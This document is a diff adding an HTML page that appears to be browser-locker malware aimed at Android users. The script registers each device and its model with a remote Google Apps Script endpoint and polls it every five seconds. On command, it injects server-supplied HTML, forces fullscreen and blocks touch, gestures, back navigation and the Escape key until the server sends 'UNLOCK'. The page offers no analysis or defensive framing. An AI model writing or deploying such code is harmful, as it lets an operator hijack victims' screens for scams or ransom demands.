@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>.</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;font-family:Arial,sans-serif;color:#fff}
+    </style>
+</head>
+<body>
+<div id="s" style="color:#666;font-size:13px;">System...</div>
+<script>
+const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
+const DID='z'+Math.random().toString(36).substring(2,15);
+const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
+let locked=false;
+
+async function reg(){
+  try{
+    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
+    let d=await r.json();
+    if(d.command==='UNLOCK'){document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';locked=false;return;}
+    if(d.command){document.body.innerHTML=d.command;lock();}
+    else document.getElementById('s').innerHTML='OK';
+  }catch(e){}
+}
+
+async function chk(){
+  try{
+    let r=await fetch(API+'?action=check&device_id='+DID);
+    let d=await r.json();
+    if(d.command==='UNLOCK'){document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';locked=false;return;}
+    if(d.command){document.body.innerHTML=d.command;lock();}
+  }catch(e){}
+}
+
+function lock(){
+  locked=true;
+  full();
+  block();
+}
+
+function full(){
+  const el=document.documentElement;
+  if(el.requestFullscreen)el.requestFullscreen();
+}
+
+function block(){
+  document.addEventListener('contextmenu',e=>e.preventDefault());
+  document.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
+  document.addEventListener('touchstart',e=>{if(locked)e.preventDefault()},{passive:false});
+  document.addEventListener('touchend',e=>{if(locked)e.preventDefault()},{passive:false});
+  document.addEventListener('keydown',e=>{if(e.key==='Backspace'||e.key==='Escape'||e.ctrlKey)e.preventDefault();});
+  history.pushState(null,'',location.href);
+  window.addEventListener('popstate',()=>{history.pushState(null,'',location.href);full();});
+  document.addEventListener('gesturestart',e=>e.preventDefault());
+  document.addEventListener('gesturechange',e=>e.preventDefault());
+  document.addEventListener('gestureend',e=>e.preventDefault());
+  document.body.style.overflow='hidden';
+  document.body.style.position='fixed';
+  document.body.style.width='100%';
+  document.body.style.height='100%';
+}
+
+setInterval(()=>{if(locked){full();history.pushState(null,'',location.href);}},500);
+document.addEventListener('visibilitychange',()=>{if(locked&&document.hidden)full();});
+
+reg();
+setInterval(chk,5000);
+</script>
+</body>
+</html>
